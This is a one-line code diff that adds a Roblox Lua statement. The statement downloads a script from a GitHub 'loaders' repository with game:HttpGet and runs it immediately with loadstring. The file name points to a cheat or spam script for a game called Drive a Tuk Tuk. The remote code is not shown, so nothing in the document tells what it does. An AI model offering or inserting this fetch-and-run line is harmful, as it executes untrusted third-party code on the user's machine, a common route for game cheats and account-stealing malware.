@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/drive-a-tuk-tuk-spam5-fmte5mh9o22yc8.lua"))()
